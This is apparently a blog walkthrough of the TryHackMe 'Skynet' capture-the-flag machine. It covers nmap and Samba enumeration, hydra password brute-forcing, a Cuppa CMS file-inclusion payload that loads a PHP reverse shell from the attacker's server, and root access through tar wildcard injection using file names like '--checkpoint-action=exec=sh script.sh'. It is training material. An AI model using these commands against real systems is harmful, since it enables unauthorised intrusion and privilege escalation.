---
layout: post
title:  "Tryhackme: Skynet"
date:   2021-01-18 08:00:56 +0200
categories: tryhackme
---

## Nmap Scan ##

We first begin by simply scanning the machine using nmap:
```sudo nmap -sSVC -A -T5 10.10.32.220 -p- -oN=nmapScan -vv```

```
Nmap scan report for 10.10.32.220
Host is up, received echo-reply ttl 63 (0.057s latency).
Scanned at 2021-01-20 15:44:47 EST for 246s
Not shown: 65529 closed ports
Reason: 65529 resets
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKeTyrvAfbRB4onlz23fmgH5DPnSz07voOYaVMKPx5bT62zn7eZzecIVvfp5LBCetcOyiw2Yhocs0oO1/RZSqXlwTVzRNKzznG4WTPtkvD7ws/4tv2cAGy1lzRy9b+361HHIXT8GNteq2mU+boz3kdZiiZHIml4oSGhI+/+IuSMl5clB5/FzKJ+mfmu4MRS8iahHlTciFlCpmQvoQFTA5s2PyzDHM6XjDYH1N3Euhk4xz44Xpo1hUZnu+P975/GadIkhr/Y0N5Sev+Kgso241/v0GQ2lKrYz3RPgmNv93AIQ4t3i3P6qDnta/06bfYDSEEJXaON+A9SCpk2YSrj4A7
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0UWS0x1ZsOGo510tgfVbNVhdE5LkzA4SWDW/5UjDumVQ7zIyWdstNAm+lkpZ23Iz3t8joaLcfs8nYCpMGa/xk=
|   256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICHVctcvlD2YZ4mLdmUlSwY8Ro0hCDMKGqZ2+DuI0KFQ
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        syn-ack ttl 63 Dovecot pop3d
|_pop3-capabilities: CAPA SASL AUTH-RESP-CODE UIDL TOP PIPELINING RESP-CODES
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        syn-ack ttl 63 Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS IDLE ID more IMAP4rev1 post-login have listed capabilities Pre-login LITERAL+ SASL-IR OK ENABLE LOGINDISABLEDA0001
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
OS fingerprint not ideal because: Timing level 5 (Insane) used
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 3.16 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%), Android 7.1.1 - 7.1.2 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/20%OT=22%CT=1%CU=38029%PV=Y%DS=2%DC=T%G=N%TM=60089735%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=I%TS=8)
OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
```

## Enumerating Samba ##

The first thing that we see is that nmap detected a service that is very famous for how commonly misconfigured it is: ```Samba```

As such, we will try to do an initial enumeration and see what we can scavenge:
```
enum4linux -U -S -P 10.10.32.220
```
```
|    Target Information    |
 ========================== 
Target ........... 10.10.32.220
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.32.220    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ===================================== 
|    Session Check on 10.10.32.220    |
 ===================================== 
[+] Server 10.10.32.220 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 10.10.32.220    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ============================= 
|    Users on 10.10.32.220    |
 ============================= 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson       Name:   Desc: 

user:[milesdyson] rid:[0x3e8]

 ========================================= 
|    Share Enumeration on 10.10.32.220    |
 ========================================= 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.32.220
//10.10.32.220/print$   Mapping: DENIED, Listing: N/A
//10.10.32.220/anonymous        Mapping: OK, Listing: OK
//10.10.32.220/milesdyson       Mapping: DENIED, Listing: N/A
//10.10.32.220/IPC$     [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ==================================================== 
|    Password Policy Information for 10.10.32.220    |
 ==================================================== 


[+] Attaching to 10.10.32.220 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] SKYNET
        [+] Builtin

[+] Password Info for Domain: SKYNET

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5

enum4linux complete on Wed Jan 20 15:48:45 2021
```

## Password Bruteforcing ##

Since we know ssh is open on the machine, and we have found a user, let's try to bruteforce its password"

```hydra -l milesdyson -P /usr/share/wordlists/rockyou.txt.gz 10.10.32.220 -t 16 ssh```

Unfortunately, no success, let's try some other ways, before attempting another bigger wordlist.

## Further Samba enumeration ##

Let's login into the samba service as ```anonymous:anonymous``` and see what we can find:
```smbclient //10.10.32.220/anonymous```
This looks interesting:
```
smb: \> ls
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5831036 blocks available
```

Let's scavenge everything we can!
```
smb: \> get attention.txt logs
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 00:42:16 2019
  ..                                  D        0  Thu Nov 26 11:04:00 2020
  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
  log3.txt                            N        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5831036 blocks available
smb: \logs\> get log1.txt
smb: \logs\> get log2.txt
smb: \logs\> get log3.txt
```

Bingo! ```log1.txt``` seems to have some possible credentials. Let's try bruteforcing again:

```hydra -l milesdyson -P log1.txt 10.10.32.220 -t 16 ssh```

Still no success.

## Directory Bruteforcing ##

Since ```nmap``` told us there is a web server running on the machine, let's see what we can find on it:

```gobuster dir -u http://10.10.32.220 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 16```

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.32.220
[+] Threads:        16
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/20 16:01:02 Starting gobuster
===============================================================
/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/config (Status: 301)
/ai (Status: 301)
/squirrelmail (Status: 301)
/server-status (Status: 403)
===============================================================
2021/01/20 16:17:42 Finished
===============================================================
```

This is interesting: a mail client!

Bingo! Logging in as ```milesdyson``` with one of the previously found passwords reveals us this user's inbox, including one interesing email that gives us the ```samba``` password.

Logging in with the new found password we can find inside ```notes/important.txt``` an interesting string that would be our hidden directory.

## Further Directory Bruteforcing ##

Running gobuster against this new found directory gives us some interesting results:

```gobuster dir -u http://10.10.32.220/45kra24zxs28v3yd -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 16```

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.32.220/45kra24zxs28v3yd
[+] Threads:        16
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/20 16:10:34 Starting gobuster
===============================================================
/administrator (Status: 301)
===============================================================
2021/01/20 16:26:24 Finished
===============================================================
```

## Exploiting CMS ##

In the newfound directory we are prompted with a login screen, that indicated the usage of the ```Cuppra CMS```.

Running a ```searchsploit``` for this yields us a potential exploit. This can be found in Kali in ```/usr/share/exploitdb/exploits/php/webapps/25971.txt```.

We can use one Kali's already existing PHP reverse shells and then we can run our python server so that the remote machine can execute it and out netcat listener can catch it:
```
$ cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php
$ python3 -m http.server 8000
$ nc -lnvp 1234
```
Our final payload will be:
```
http://machine-ip/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://my-ip:8000/shell.php
```


## Shell Stabilisation ##

Alright, now that we've set foothold, we need to stabilise our weak shell.
```
python -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
```
Proceed to background this process through ```CTRL+Z```, and then, in our previous shell:
```
$ stty raw -echo; fg
```
Now we have a stable shell! Let's get out flag:
```
www-data@skynet:/tmp$ ls /home/milesdyson/                                                                
backups  mail  share  user.txt
www-data@skynet:/$ cat /home/milesdyson/user.txt
```

The directory ```backups``` also seems a promising privilege escalation vector, as ```backups/backup.sh``` seems to be a jobs that is ran as ```root```.


## Privilege Escalation ##

Let's download ```LinPEAS``` from our machine, using our previously opened http server:

```
www-data@skynet:/$ cd /tmp/
www-data@skynet:/tmp$ wget http://my-ip:8000/linpeas.sh
www-data@skynet:/tmp$ chmod +x linpeash.sh
www-data@skynet:/tmp$ ./linpeas.sh
```

LinPEAS seems to indicate towards the same script we have stumbled upon previously. This is clearly an opportunity to execute scripts using ```tar``` checkpoints, since its wildcard expansion is vulnerable.

This is a great article going over such Privilege Escalation vectors:
```
https://cxyy4rle.blogspot.com/2021/01/privilege-escalation-in-linux-via.html
```

Thus, we will issue the following commands:
```
echo "cat root/root.txt > /var/www/html/flag.txt" > script.sh
echo "/var/www/html"  > "--checkpoint-action=exec=sh script.sh"
echo "/var/www/html"  > "--checkpoint=1"
```

After a while, a file ```flag.txt``` will appear in this directory that will contain the root flag!